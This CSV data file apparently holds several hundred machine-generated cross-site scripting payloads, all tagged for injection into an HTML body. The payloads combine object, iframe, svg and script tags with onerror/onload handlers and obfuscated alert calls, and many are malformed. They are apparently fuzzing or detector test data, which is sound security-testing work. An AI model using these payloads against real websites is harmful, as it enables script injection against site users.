eval_place,injection_code
body_tag,<object/onerror=javascript:alert();src=x data=saivs.html </embed>
body_tag,<iframe/onload=alert();src=x src=/ </frameset>
body_tag,<frameset><frame/onload=alert();src=x src=saivs.js </iframe>
body_tag,<iframe onload=alert();data=saivs.html </select><body/
body_tag,<body/onload=alert();data=saivs.html <svg </img>
body_tag,<object/data=saivs.html '<video><source onmouseover=alert();
body_tag,"<object onerror=al\u0065rt();type=""text/x-scriptlet"" <frameset><frame/src=/ "
body_tag,"<object onerror=javascript:alert();type=""text/x-scriptlet"" </frameset></canvas>"
body_tag,<body/onload=alert();data=saivs.html </a><a 
body_tag,<iframe onload=alert();prompt(1);><a 
body_tag,<object onerror=alert();>onmouseover=alert();<iframe/
body_tag,javascript:al\u0065rt();<object/data=saivs.html <frameset><frame/al\u0065rt``;
body_tag,onmouseover=alert();<object data=saivs.html </frameset>prompt(1);
body_tag,onload=alert();<object data=saivs.html </frameset>\u0061lert``;
body_tag,javascript:al\u0065rt();<object/data=saivs.html <frameset><frame/alert``;
body_tag,onmouseover=alert();<object data=saivs.html <frameset><frame/al\u0065rt``;
body_tag,onload=alert();<object/data=saivs.html <frameset><frame \u0061lert``;
body_tag,javascript:al\u0065rt();<object/data=saivs.html </frameset>\u0061lert``;
body_tag,<object/onerror=alert();><a <iframe/
body_tag,<object/data=saivs.html javascript:\u0061lert();</a>src=  
body_tag,<object/data=saivs.html <img/</canvas></frameset>
body_tag,<svg onload=alert();javascript:\u0061lert(); /> />
body_tag,<object/onerror=al\u0065rt();onerror=alert();confirm(1);>
body_tag,<object onerror=al\u0065rt();onerror=al\u0065rt();>confirm(1);
body_tag,<object onerror=javascript:alert();saivs.js > />
body_tag,data=<object onerror=javascript:alert();>onerror=\u0061lert();
body_tag,onerror=javascript:alert();<object/onerror=\u0061lert(); />javascript:al\u0065rt();
body_tag,"<video><source onerror=\u0061lert();type=""image"" <video><source </script>"
body_tag,<video><source/onerror=javascript:alert();><video><source <video><source/
body_tag,<script </iframe>al\u0065rt();</script><video><source/
body_tag,<object/data=saivs.html <img \u0061lert();</object>
body_tag,<object/data=saivs.html </img>onerror=alert();<object 
body_tag,<object/data=saivs.html </select>javascript:alert();saivs.js 
body_tag,<object data=saivs.html </object>onerror=javascript:alert();javascript:alert();
body_tag,"<object data=saivs.html </select>data=saivs.html data=""data:text/html,"
body_tag,<object data=saivs.html \u0061lert``;<select </canvas>
body_tag,<object data=saivs.html alert``;<svg/</embed>
body_tag,<object data=saivs.html al\u0065rt();</frameset>src=saivs.js 
body_tag,<object/data=saivs.html al\u0065rt``;<frameset><frame src=  
body_tag,"<object/onerror=javascript:alert();type=""image"" </iframe><img/"
body_tag,"<object/onerror=al\u0065rt();type=""text/x-scriptlet"" </iframe><option/"
body_tag,"<object/onerror=al\u0065rt();type=""text/x-scriptlet"" </iframe><img "
body_tag,"<object onerror=\u0061lert();type=""text/x-scriptlet"" <frameset><frame/</img>"
body_tag,<object/onerror=\u0061lert();data=saivs.html <svg </img>
body_tag,<object onerror=\u0061lert();data=saivs.html <frameset><frame <input 
body_tag,"<svg onload=alert();type=""image"" </frameset><img/"
body_tag,<svg/onload=alert();src=saivs.js <frameset><frame <img/
body_tag,<frameset><frame/onload=alert();data=saivs.html <frameset><frame/<img 
body_tag,"<svg onload=alert();type=""image"" <frameset><frame/<img/"
body_tag,"<frameset><frame/onload=alert();type=""image"" <svg/</img>"
body_tag,<object/saivs.js data=saivs.html </frameset></img>
body_tag,<frameset><frame/onload=alert();src=x </frameset></img>
body_tag,<frameset><frame onload=alert();src=saivs.js </frameset></img>
body_tag,<frameset><frame onload=alert();src=x </frameset><body 
body_tag,<frameset><frame <iframe/onload=alert();confirm(1);>
body_tag,<object <body onerror=al\u0065rt(); />>
body_tag,<object data=saivs.html onload=alert();</a></select>
body_tag,<object data=saivs.html \u0061lert();<video><source/<object 
body_tag,<object data=saivs.html confirm(1);<video><source/<svg/
body_tag,<object/onerror=\u0061lert();saivs.js <script/<frameset><frame/
body_tag,<object onerror=al\u0065rt();><img/</object>
body_tag,<iframe/onload=alert();><onerror=alert();
body_tag,<img/onerror=javascript:alert();src=x src=saivs.js <frameset><frame 
body_tag,</img>onerror=al\u0065rt();<embed/<embed <iframe 
body_tag,<object data=saivs.html <embed/</object><frameset><frame 
body_tag,<object/data=saivs.html <select </frameset><svg 
body_tag,<object data=saivs.html </object><frameset><frame </select>
body_tag,<object data=saivs.html <object/</frameset></select>
body_tag,<object data=saivs.html <object/</frameset><embed 
body_tag,<object/data=saivs.html data=saivs.html <a </a>
body_tag,<object/data=saivs.html onerror=javascript:alert();<a/</a>
body_tag,<object/data=saivs.html data=</a><img/
body_tag,<body/<svg/onload=alert();><video><source 
body_tag,<body <iframe/onload=alert(); </script>
body_tag,<object/<embed data=saivs.html /<video><source 
body_tag,<body/<select onload=alert(); </script>
body_tag,</img><object onerror=al\u0065rt(); <script>
body_tag,<object/data=saivs.html <embed/</img><img/
body_tag,<object/data=saivs.html src=/ </iframe></img>
body_tag,<object/data=saivs.html src=  <frameset><frame/<img 
body_tag,<object data=saivs.html data=saivs.html <object </img>
body_tag,src=saivs.js <object data=saivs.html <object/<frameset><frame 
body_tag,data=<object/data=saivs.html </canvas><body/
body_tag,'<object <canvas/onerror=alert();>
body_tag,<video><source/onerror=alert(); />alert``; 
body_tag,<video><source/onerror=alert(); />onload=alert(); 
body_tag,<video><source/onerror=alert();>onload=alert(); 
body_tag,<script onmouseover=alert();>onerror=alert();/
body_tag,<script/</a>prompt(1);</script> 
body_tag,<object/data=saivs.html <video><source </a>/
body_tag,<object data=saivs.html <video><source/<option//
body_tag,<object/data=saivs.html <video><source <option//
body_tag,<object data=saivs.html </script><video><source/ 
body_tag,<object/onerror=alert();><embed <iframe 
body_tag,<svg onload=alert(); /><canvas/<body 
body_tag,<object/onerror=javascript:alert();><embed <img 
body_tag,al\u0065rt``;<object data=saivs.html  /><body 
body_tag,al\u0065rt``;<object onerror=al\u0065rt();><option 
body_tag,"javascript:al\u0065rt();<object/onerror=al\u0065rt();type=""text/x-scriptlet"" <frameset><frame/"
body_tag,<object/<canvas data=saivs.html <object/</iframe>
body_tag,<object <select/data=saivs.html </select></iframe>
body_tag,<object/<select data=saivs.html <select <frameset><frame 
body_tag,<object <select data=saivs.html <object/</object>
body_tag,<object <canvas/data=saivs.html <embed </select>
body_tag,<object data=saivs.html </select><object/<
body_tag,<object data=saivs.html </iframe></img><input 
body_tag,<frameset><frame/onload=alert();javascript:al\u0065rt();><a/
body_tag,<body/onload=alert();al\u0065rt(); /><body 
body_tag,<video><source/onerror=al\u0065rt(); />#\u0061lert``;
body_tag,"<object/data=saivs.html src=""data:text/html,src=""data:text/html,</canvas>"
body_tag,<object/data=saivs.html onload=alert();</img><input 
body_tag,"<object/data=saivs.html onload=alert();""</a><input "
body_tag,<svg/onload=alert();javascript:alert(); />confirm(1);
body_tag,<object <svg <body/data=saivs.html </img>
body_tag,<object data=saivs.html </frameset><option <embed/
body_tag,<video><source/onerror=\u0061lert();>/#
body_tag,"<object data=saivs.html <frameset><frame/data=""data:text/html,<body/"
body_tag,</frameset>data=saivs.html <object data=saivs.html </img>
body_tag,<object/data=saivs.html <frameset><frame/data=saivs.html <img/
body_tag,<object data=saivs.html <svg/javascript:alert();</img>
body_tag,<iframe/onload=alert();\u0061lert``;><frameset><frame/
body_tag,"<body onload=alert();"""" /><select "
body_tag,</iframe><svg/onload=alert();><a 
body_tag,</iframe><object data=saivs.html ><a 
body_tag,"<body onload=alert();type=""text/x-scriptlet"" </a><svg "
body_tag,</frameset><object/data=saivs.html </embed><option/
body_tag,</select><object data=saivs.html <select/</a>
body_tag,</embed><object data=saivs.html </object><img 
body_tag,alert();<object <embed/data=saivs.html </canvas>
body_tag,alert();<object data=saivs.html </select><iframe 
body_tag,"type=""image"" <object data=saivs.html </object></a>"
body_tag,</object><object data=saivs.html <frameset><frame/<option/
body_tag,<object/<embed data=saivs.html <frameset><frame/<option/
body_tag,<object data=saivs.html src=/ <option </iframe>
body_tag,<object/data=saivs.html src=  </a>src=/ 
body_tag,<object <object/data=saivs.html </img><object/
body_tag,</object><iframe onload=alert();><input 
body_tag,<object/data=saivs.html </canvas>#<script/
body_tag,<object/data=saivs.html </object><iframe <select/
body_tag,<object/onerror=javascript:alert();src=x <body </frameset>
body_tag,javascript:alert();<iframe/onload=alert();saivs.js <video><source 
body_tag,<object/data=saivs.html <select <svg <frameset><frame 
body_tag,<object data=saivs.html </object></object><object/
body_tag,<object data=saivs.html <object </frameset></frameset>
body_tag,<object data=saivs.html data=saivs.html </object>>
body_tag,<object/data=saivs.html </select>onerror=alert();alert``;
body_tag,data=<iframe/<canvas/onload=alert();>
body_tag,src=saivs.js </img><iframe/onload=alert(); />
body_tag,<video><source/onerror=alert(); <script/<frameset><frame 
body_tag,<script>al\u0065rt(); </script>al\u0065rt``;
body_tag,<script>alert``; </script><
body_tag,<script>alert``; </script>>
body_tag,<script>prompt(1); </script>>
body_tag,<script>alert``; </script>#
body_tag,<script>alert(); </script>>
body_tag,<video><source onerror=\u0061lert(); <video><source/al\u0065rt``;
body_tag,<video><source onerror=al\u0065rt(); <video><source/\u0061lert``;
body_tag,<video><source/onerror=\u0061lert(); <video><source >
body_tag,onload=alert();<object/data=saivs.html <video><source <script 
body_tag,<object data=saivs.html  /></select><video><source/
body_tag,<object/onerror=javascript:alert();saivs.js </canvas><script/
body_tag,<body onload=alert(); />onerror=javascript:alert();<video><source/
body_tag,"<body/onload=alert();"""" /><a "
body_tag,</iframe>src=/ <object/data=saivs.html </canvas>
body_tag,<object data=saivs.html <object <object </select>
body_tag,<object/data=saivs.html </object><iframe <object 
body_tag,<object data=saivs.html <canvas </img><svg/
body_tag,<object/data=saivs.html </embed><img <iframe 
body_tag,"<iframe/type=""image"" onload=alert();><img "
body_tag,"<object data=saivs.html </img>type=""text/x-scriptlet"" \u0061lert``;"
body_tag,<object data=saivs.html </iframe><a/saivs.js 
body_tag,<body/onload=alert();data=saivs.html <img/ />
body_tag,<video><source/onerror=alert(); /><video><source  
body_tag,<script/onerror=\u0061lert();alert``;<video><source/ 
body_tag,"<iframe/onload=alert();type=""text/x-scriptlet"" <frameset><frame confirm(1);"
body_tag,<object/data=saivs.html </frameset>javascript:alert();<a/
body_tag,"<object onerror=javascript:alert();type=""text/x-scriptlet"" onload=alert(); />"
body_tag,"<object onerror=javascript:alert();src=x "" />"
body_tag,"<object/data=saivs.html </object>onerror=\u0061lert();data=""data:text/html,"
body_tag,<iframe/onload=alert();javascript:alert(); />/
body_tag,<object/data=saivs.html <video><source//<option/
body_tag,<object data=saivs.html <img ></img>
body_tag,"data=""data:text/html,<object/onerror=\u0061lert(); /><a "
body_tag,</embed><object/data=saivs.html  /><script/
body_tag,<video><source/onerror=javascript:alert();>al\u0065rt();<input/
body_tag,<object/onerror=al\u0065rt();src=x javascript:al\u0065rt();</a>
body_tag,<body/onload=alert();src=saivs.js  /><script 
body_tag,<body onload=alert();javascript:al\u0065rt();><a/
body_tag,<iframe onload=alert();javascript:alert();></a>
body_tag,<body/onload=alert();onmouseover=alert();><a 
body_tag,<iframe javascript:\u0061lert();onerror=\u0061lert();prompt(1);<a/
body_tag,<object onerror=\u0061lert();onerror=\u0061lert(); /><a/
body_tag,<object onerror=al\u0065rt();data=saivs.html confirm(1);</a>
body_tag,"data=""data:text/html,<iframe/<embed/onload=alert(); />"
body_tag,<object/<object/onerror=\u0061lert(); />saivs.js 
body_tag,<object/data=saivs.html src=/ <script/</embed>
body_tag,<object/<embed onerror=\u0061lert(); /><canvas/
body_tag,<object onerror=javascript:alert();src=saivs.js prompt(1);</canvas>
body_tag,<object/data=saivs.html <embed ><embed/
body_tag,<object/onerror=alert();<select data=saivs.html <frameset><frame 
body_tag,"<object/onerror=javascript:alert();type=""text/x-scriptlet"" src=  </img>"
body_tag,"<body onload=alert(); <video><source/"""
body_tag,<body/onload=alert(); <video><source/al\u0065rt``;
body_tag,<object/onerror=javascript:alert(); </script>#
body_tag, <script>alert(); </script>
body_tag,<object/data=saivs.html <body onmouseover=alert();</select>
body_tag,alert``;<object data=saivs.html javascript:alert();>
body_tag,\u0061lert``;<svg/onload=alert();onerror=alert(); />
body_tag,"""<option/al\u0065rt``;\u0061lert();#"
body_tag,"\u0061lert();<iframe onload=alert();""onload=alert();"">"
body_tag,"type=""image"" <object onerror=al\u0065rt();javascript:al\u0065rt();>"
body_tag,</object><object onerror=\u0061lert();onerror=alert();>
body_tag,<object/<object onerror=alert();javascript:\u0061lert();>
body_tag,<object <select data=saivs.html onerror=\u0061lert(); />
body_tag,<svg/<object/saivs.js onload=alert();>
body_tag,<body onload=alert();src=x <frameset><frame/<img/
body_tag,<frameset><frame <select/<script/onload=alert(); />
body_tag,<object/<canvas/<script/onerror=alert();>
body_tag,<object src=/ data=saivs.html <input </iframe>
body_tag,"<object onerror=\u0061lert();javascript:alert();type=""image"" </iframe>"
body_tag,"<object onerror=javascript:alert();type=""text/x-scriptlet"" javascript:\u0061lert();</object>"
body_tag,<object/data=saivs.html confirm(1);<frameset><frame/ />
body_tag,<object data=saivs.html onload=alert();</frameset><
body_tag,<object data=saivs.html onerror=javascript:alert();</iframe>al\u0065rt();
body_tag,<object data=saivs.html </embed></canvas>saivs.js 
body_tag,<object <embed data=saivs.html </embed></img>
body_tag,"<object data=saivs.html onload=alert();""<script><video><source/"
body_tag,<object/data=saivs.html alert();</script><video><source/
body_tag,"<body onload=alert();type=""text/x-scriptlet"" <a/</a>"
body_tag,</frameset><object onerror=al\u0065rt();>javascript:\u0061lert();
body_tag,<object onerror=\u0061lert();data=saivs.html <select </embed>
body_tag,<svg onload=alert();src=saivs.js <svg </canvas>
body_tag,<object onerror=alert();src=saivs.js </iframe>src=x 
body_tag,"<frameset><frame onload=alert();""onload=alert();""<object <frameset><frame "
body_tag,<frameset><frame/onload=alert();javascript:alert();src=x <frameset><frame/
body_tag,<iframe/onload=alert();javascript:al\u0065rt();src=x <frameset><frame 
body_tag,"<iframe/onload=alert();""onload=alert();""<select </iframe>"
body_tag,<frameset><frame/onload=alert();saivs.js </object><iframe 
body_tag,<object/<canvas onerror=alert();saivs.js </iframe>
body_tag,<svg <iframe onload=alert();><embed 
body_tag,"</frameset><frameset><frame/onload=alert(); />type=""text/x-scriptlet"" "
body_tag,<iframe/<iframe/onload=alert(); />alert``;
body_tag,</frameset><frameset><frame/onload=alert();>al\u0065rt``;
body_tag,<object <iframe onerror=alert();>alert``;
body_tag,<frameset><frame <input/onload=alert(); />confirm(1);
body_tag,<frameset><frame/<input onload=alert();prompt(1); />
body_tag,<iframe <input onload=alert(); />/
body_tag,"<frameset><frame/<body onload=alert(); />"""
body_tag,<object/<input/onerror=alert();>#
body_tag,</frameset><object/onerror=al\u0065rt();src=saivs.js <video><source 
body_tag,><script/</a>\u0061lert();</script>
body_tag,<script/al\u0065rt();</a>onerror=\u0061lert();</script>
body_tag,<frameset><frame onload=alert();src=saivs.js </embed>saivs.js 
body_tag,data=<object saivs.js onerror=javascript:alert(); />
body_tag,<video><source/onerror=al\u0065rt(); /><video><source//
body_tag,<script>javascript:\u0061lert();prompt(1);</script> 
body_tag,<video><source/onerror=\u0061lert();></a>#
body_tag,<script>javascript:al\u0065rt();onerror=alert();</script> 
body_tag,src=x <iframe onload=alert(); /><option 
body_tag,<object/<object onerror=alert();><script/
body_tag,</embed><object onerror=alert(); /></img>
body_tag,<object/src=saivs.js onerror=alert();><a/
body_tag,<iframe/data=saivs.html onload=alert();><a/
body_tag,<iframe/onload=alert();saivs.js  /></a>
body_tag,<object/onerror=javascript:alert();onmouseover=alert(); /><option 
body_tag,<object/onerror=javascript:alert();al\u0065rt(); /><img/
body_tag,<svg/onload=alert();al\u0065rt();><script/
body_tag,<object/saivs.js onerror=al\u0065rt();><input 
body_tag,alert``;<svg onload=alert();saivs.js </frameset>
body_tag,javascript:al\u0065rt();<object data=saivs.html \u0061lert();<frameset><frame 
body_tag,src=  <object data=saivs.html onerror=alert();</select>
body_tag,</embed><object onerror=javascript:alert();saivs.js </select>
body_tag,<svg/<object/onload=alert();saivs.js </embed>
body_tag,<script/src=saivs.js <video><source <body/</script>
body_tag,<script>\u0061lert(); </script><script>
body_tag,<video><source onerror=alert(); </script><script>
body_tag,<video><source/onerror=javascript:alert(); /><a <video><source 
body_tag,<video><source onerror=alert(); </script><script>
body_tag,<video><source onerror=\u0061lert(); </script><script>
body_tag,<video><source/onerror=\u0061lert(); <script><script>
body_tag,<video><source src=/  <script><script>
body_tag,onerror=\u0061lert();<object/onerror=al\u0065rt(); /><select/
body_tag,javascript:alert();<object data=saivs.html ><canvas 
body_tag,javascript:alert();<object data=saivs.html  />src=x 
body_tag,<object/data=saivs.html >><object 
body_tag,<object/onerror=javascript:alert();\u0061lert``;><object/
body_tag,<object/<embed/onerror=alert(); />onerror=javascript:alert();
body_tag,<object/<svg/data=saivs.html javascript:al\u0065rt();</canvas>
body_tag,<object/data=saivs.html </object><input saivs.js 
body_tag,<object/data=saivs.html </iframe>al\u0065rt();</img>
body_tag,</select>src=x <svg/onload=alert(); />
body_tag,</select>src=  <object/onerror=al\u0065rt();>
body_tag,<embed/</embed><object/onerror=javascript:alert(); />
body_tag,data=</canvas><object onerror=al\u0065rt(); />
body_tag,"</canvas>data=""data:text/html,<body onload=alert(); />"
body_tag,"type=""image"" prompt(1);<video><source onerror=al\u0065rt(); />"
body_tag,src=x confirm(1);<a onmouseover=alert();alert``;
body_tag,<object data=saivs.html alert();<frameset><frame/data=
body_tag,<object/onerror=al\u0065rt();src=x <svg </embed>
body_tag,<object/data=saivs.html <embed/<iframe </embed>
body_tag,<object onerror=\u0061lert();src=x <embed </object>
body_tag,<object data=saivs.html </canvas>src=saivs.js <svg 
body_tag,<object data=saivs.html <option/javascript:\u0061lert();</iframe>
body_tag,"<object data=saivs.html </a>onload=alert();""data=""data:text/html,"
body_tag,"<object data=saivs.html </img>onload=alert();type=""text/x-scriptlet"" "
body_tag,<object data=saivs.html data=<object </canvas>
body_tag,<object data=saivs.html onerror=al\u0065rt();</object><object/
body_tag,<object data=saivs.html data=saivs.html <object/</object>
body_tag,data=<object onerror=alert(); />saivs.js 
body_tag,<video><source/onerror=alert(); </script></script>
body_tag,<img onerror=alert();alert``;<iframe <input/
body_tag,<frameset><frame onload=alert();data=saivs.html </frameset><canvas 
body_tag,<object onerror=alert();saivs.js </iframe></iframe>
body_tag,<object/data=saivs.html </img>><input 
body_tag,<script>onerror=al\u0065rt();</script><a/</script>
body_tag,<script>onerror=\u0061lert();</script><video><source/<script>
body_tag,<script>onmouseover=alert();</script><script <video><source/
body_tag,<script>javascript:al\u0065rt();</script><video><source/<script>
body_tag,<script>onerror=\u0061lert();</script><video><source <script>
body_tag,<script>onload=alert();</script></script></script>
body_tag,<script>alert``;</script><video><source <script>
body_tag,<script>javascript:alert();</script><script <script>
body_tag,<script>onerror=alert();</script><video><source/</script>
body_tag,<script>onerror=\u0061lert();</script></script><script>
body_tag,<script>javascript:al\u0065rt();</script><video><source <script>
body_tag,<script>al\u0065rt();</script></script><script>
body_tag,<script>onerror=al\u0065rt();</script></script></script>
body_tag,<script>onmouseover=alert();</script><script><script>
body_tag,<script>\u0061lert();</script></script></script>
body_tag,<script>\u0061lert();</script><script><script>
body_tag,<script>alert();</script><script><script>
body_tag,<script>onmouseover=alert();</script></script></script>
body_tag,<script>al\u0065rt``;</script></script></script>
body_tag,<script>al\u0065rt();</script><script><script>
body_tag,<script>onerror=alert();</script><script><script>
body_tag,<script>prompt(1);</script><script><script>
body_tag,<script>alert();</script><script><script>
body_tag,<script>alert``;</script><script/</script>
body_tag,<script>\u0061lert();</script></script></script>
body_tag,<script>confirm(1);</script><script><script>
body_tag,<script>onload=alert(); </script><video><source 
body_tag,<script>onmouseover=alert(); </script><video><source/
body_tag,<script>javascript:\u0061lert(); </script><video><source/
body_tag,<script>onload=alert(); </script><frameset><frame 
body_tag,<script>javascript:\u0061lert(); </script></object>
body_tag,"<body/onload=alert();type=""text/x-scriptlet"" <iframe/</embed>"
body_tag,<object/data=saivs.html confirm(1);<svg </script>
body_tag,src=saivs.js <iframe/onload=alert();data=saivs.html </script>
body_tag,<object <canvas data=saivs.html ><a/
body_tag,<frameset><frame <canvas/onload=alert(); /><script/
body_tag,<object/<embed data=saivs.html  /><a/
body_tag,<object <canvas/onerror=\u0061lert();><option 
body_tag,<svg src=x onload=alert(); /><input 
body_tag,<object data=saivs.html </img> />onmouseover=alert();
body_tag,<object/data=saivs.html </img><javascript:al\u0065rt();
body_tag,<object data=saivs.html </iframe><</embed>
body_tag,<frameset><frame <embed/onload=alert(); />src=saivs.js 
body_tag,<object/onerror=\u0061lert(); </script>javascript:al\u0065rt();
body_tag,<object onerror=al\u0065rt(); <script>onerror=\u0061lert();
body_tag,<body/onload=alert(); <script><body/
body_tag,<object/onerror=al\u0065rt(); <script>data=
body_tag,"<object onerror=\u0061lert(); <video><source type=""text/x-scriptlet"" "
body_tag,<svg/onload=alert(); <script><img 
body_tag,<object data=saivs.html  <video><source onerror=javascript:alert();
body_tag,<body/onload=alert(); <script><a/
body_tag,<iframe/onload=alert(); </script><svg 
body_tag,<object onerror=alert(); <script><input 
body_tag,<object onerror=alert(); <script><a 
body_tag,<object onerror=alert(); </script><video><source/
body_tag,<body/onload=alert();> /><canvas 
body_tag,</img><object data=saivs.html </canvas><option 
body_tag,<script </select>onmouseover=alert();saivs.js </script>
body_tag,<object data=saivs.html onerror=\u0061lert();</select></select>
body_tag,<object data=saivs.html </object><input/<
body_tag,"<object type=""image"" <iframe onerror=\u0061lert(); />"
body_tag,"<object data=saivs.html <frameset><frame data=""data:text/html,al\u0065rt``;"
body_tag,<object data=saivs.html </frameset>\u0061lert();</select>
body_tag,<object/data=saivs.html <object javascript:\u0061lert();</select>
body_tag,<object data=saivs.html </embed>onerror=alert();<input 
body_tag,<object data=saivs.html </select>onerror=alert();</iframe>
body_tag,<object data=saivs.html </embed>saivs.js <input/
body_tag,<object/data=saivs.html </a></iframe>saivs.js 
body_tag,"src=  <object/onerror=alert(); />type=""text/x-scriptlet"" "
body_tag,"<svg/type=""text/x-scriptlet"" onload=alert();></select>"
body_tag,<object <embed onerror=al\u0065rt(); /></canvas>
body_tag,<iframe/onload=alert();\u0061lert(); /><object/
body_tag,"<body/onload=alert();""saivs.js <<svg "
body_tag,<body onload=alert();\u0061lert``; /><frameset><frame/
body_tag,<iframe/onload=alert();saivs.js <<frameset><frame 
body_tag,<iframe/onload=alert();alert(); /></iframe>
body_tag,<body/onload=alert();\u0061lert(); /><frameset><frame 
body_tag,<frameset><frame onload=alert();saivs.js  /><frameset><frame 
body_tag,"<iframe onload=alert();""alert();""<frameset><frame/"
body_tag,<object onerror=alert();\u0061lert(); /><frameset><frame 
body_tag,<svg onload=alert();javascript:al\u0065rt();></frameset>
body_tag,<frameset><frame/onload=alert();saivs.js confirm(1);</iframe>
body_tag,<svg/onload=alert();javascript:al\u0065rt();></iframe>
body_tag,<body/<img onload=alert();> 
body_tag,<script <embed/src=saivs.js </script></script>
body_tag,<script> \u0061lert``;</script><video><source 
body_tag,<object/onerror=alert();>#<script 
body_tag,"data=""data:text/html,<object data=saivs.html <input </object>"
body_tag,onerror=alert();<object data=saivs.html <iframe <frameset><frame 
body_tag,alert();<object data=saivs.html </iframe></a>
body_tag,"onload=alert();""<object/data=saivs.html <frameset><frame/</img>"
body_tag,<script//</script>prompt(1);</script>
body_tag,<script /</script>javascript:al\u0065rt();</script>
body_tag,</iframe><body onload=alert();>al\u0065rt();
body_tag,</select><object/data=saivs.html confirm(1);</object>
body_tag,</select><object onerror=al\u0065rt();></canvas>
body_tag,onload=alert();<body/onload=alert();><svg/
body_tag,onerror=al\u0065rt();<iframe/onload=alert();saivs.js </iframe>
body_tag,prompt(1);<object data=saivs.html <frameset><frame <select/
body_tag,<object data=saivs.html javascript:alert();<frameset><frame/<embed/
body_tag,"<svg onload=alert();type=""text/x-scriptlet"" </img></img>"
body_tag,"<frameset><frame/onload=alert();type=""image"" </iframe><body/"
body_tag,<body onload=alert();src=saivs.js </frameset><input 
body_tag,<frameset><frame/<embed/onload=alert(); /><svg 
body_tag,<object/<embed/onerror=al\u0065rt(); /><svg/
body_tag,<object <embed onerror=\u0061lert();><frameset><frame 
body_tag,"<object/onerror=\u0061lert();type=""image"" #</select>"
body_tag,"<object/type=""image"" onerror=al\u0065rt(); /><object/"
body_tag,<object/data=saivs.html </img>al\u0065rt``;src=  
body_tag,<object/<embed/<input data=saivs.html <frameset><frame 
body_tag,<script/</img>alert``;</script> />
body_tag,<script </frameset>confirm(1);</script> 
body_tag,<object data=saivs.html <select/>onerror=al\u0065rt();
body_tag,<object/src=saivs.js data=saivs.html \u0061lert``;</frameset>
body_tag,<object/data=saivs.html \u0061lert();alert``;</a>
body_tag,</object><object/onerror=\u0061lert();><a/
body_tag, <object data=saivs.html </a> 
body_tag, /><video><source/onerror=\u0061lert();> 
body_tag,<object onerror=al\u0065rt();saivs.js <video><source <video><source/
body_tag,<object data=saivs.html onmouseover=alert();<video><source/<script 
body_tag,<object/<svg data=saivs.html </select><img/
body_tag,<object <object data=saivs.html </img><option 
body_tag,<object/<input data=saivs.html </img><svg/
body_tag,"<iframe/<object onload=alert();type=""image"" >"
body_tag,"type=""text/x-scriptlet"" <object <embed onerror=alert();>"
body_tag,<frameset><frame onload=alert();data=saivs.html </embed>\u0061lert();
body_tag,<frameset><frame/onload=alert();data=saivs.html </frameset><canvas/
body_tag,<object onerror=al\u0065rt();src=saivs.js <svg/</object>
body_tag,<object/saivs.js data=saivs.html <frameset><frame/<frameset><frame 
body_tag,<object onerror=alert();saivs.js alert``;</a>
body_tag,<video><source/onerror=al\u0065rt();></script><frameset><frame 
body_tag,<script/</embed>al\u0065rt();</script></object>
body_tag,<script/</embed>al\u0065rt();</script><frameset><frame 
body_tag,<script/</canvas>alert();</script><svg/
body_tag,<script/</frameset>javascript:alert();</script><frameset><frame/
body_tag,<script/</embed>onmouseover=alert();</script><iframe/
body_tag,<script/</select>onload=alert();</script><iframe 
body_tag,<script </embed>al\u0065rt();</script></img>
body_tag,"<iframe/onload=alert();type=""text/x-scriptlet"" saivs.js </select>"
body_tag,<embed/src=  javascript:alert();></a>
body_tag,<object/src=x data=saivs.html </script>javascript:\u0061lert();
body_tag,<object onerror=javascript:alert();src=saivs.js </object><a/
body_tag,"<object onerror=javascript:alert();type=""text/x-scriptlet"" <frameset><frame <option "
body_tag,<object/data=saivs.html > src=x 
body_tag,<object data=saivs.html \u0061lert``;/</a>
body_tag,<object onerror=\u0061lert();> <a/
body_tag,<object/data=saivs.html saivs.js '</a>
body_tag,<object onerror=javascript:alert();onload=alert();><option 
body_tag,<object/onerror=javascript:alert();javascript:\u0061lert(); /><img 
body_tag,<frameset><frame onload=alert();onerror=alert();></a>
body_tag,<object <object data=saivs.html <video><source/onerror=alert();
body_tag,<object data=saivs.html <object <embed </a>
body_tag,"<object/data=saivs.html <frameset><frame/type=""text/x-scriptlet"" <img "
body_tag,<object data=saivs.html </canvas>src=x </img>
body_tag,<object/data=saivs.html </iframe>javascript:\u0061lert();<input 
body_tag,<object data=saivs.html </a>alert();<input/
body_tag,/<script </a>javascript:al\u0065rt();</script>
body_tag,<body/onmouseover=alert();<a onload=alert();>
body_tag,<frameset><frame/<select <script onload=alert(); />
body_tag,<object/data=saivs.html <frameset><frame onerror=al\u0065rt();\u0061lert();
body_tag,"type=""text/x-scriptlet"" <object/onerror=alert();onerror=alert(); />"
body_tag,src=saivs.js <object/onerror=alert();javascript:alert();>
body_tag,<object <object onerror=alert();saivs.js <frameset><frame/
body_tag,<object src=saivs.js onerror=alert(); /></canvas>
body_tag,<object/onerror=al\u0065rt();onmouseover=alert();>onmouseover=alert();
body_tag,<frameset><frame/onload=alert();saivs.js </embed>data=
body_tag,<object src=/ data=saivs.html <select/</canvas>
body_tag,data=saivs.html <object <object data=saivs.html <video><source/
body_tag,javascript:alert();<object <select data=saivs.html <video><source/
body_tag,"type=""text/x-scriptlet"" <object <iframe/data=saivs.html <video><source/"
body_tag,<object data=saivs.html <script \u0061lert``;</script>
body_tag,<a/><script>al\u0065rt``;</script>
body_tag,<script/<</script>\u0061lert();</script>
body_tag,<object onerror=\u0061lert();src=saivs.js <img <frameset><frame 
body_tag,"<object/onerror=javascript:alert();type=""image"" <frameset><frame </object>"
body_tag,<object <object onerror=al\u0065rt(); /><select/
body_tag,<iframe <input/onload=alert();>alert``;
body_tag,<svg/<canvas onload=alert();></select>
body_tag,<frameset><frame/<frameset><frame/onload=alert(); />onload=alert();
body_tag,<object data=saivs.html alert``;onerror=\u0061lert();</frameset>
body_tag,"<object/onerror=al\u0065rt();>src=""data:text/html,<svg/"
body_tag,<script/</frameset>onerror=al\u0065rt();</script> 
body_tag,<iframe/onload=alert();><iframe </canvas>
body_tag,<object/src=saivs.js data=saivs.html </select><a 
body_tag,<object data=saivs.html </select><object/<option 
body_tag,<video><source \u0061lert``;<object/onerror=al\u0065rt(); />
body_tag,"</img>src=""data:text/html,onload=alert();al\u0065rt();<option "
body_tag,"<video><source/onerror=alert();type=""image""  />/"
body_tag,<video><source saivs.js onerror=\u0061lert(); />#
body_tag,<body data=saivs.html onload=alert(); />'
body_tag,</object><object data=saivs.html </canvas><svg/
body_tag,"onload=alert();""<object onerror=\u0061lert(); /><canvas "
body_tag,"data=""data:text/html,<object onerror=javascript:alert(); /></embed>"
body_tag,"onload=alert();""<object/onerror=\u0061lert();src=x </img>"
body_tag,onerror=al\u0065rt();<object data=saivs.html data=</img>
body_tag,onerror=javascript:alert();<object/src=/ data=saivs.html </iframe>
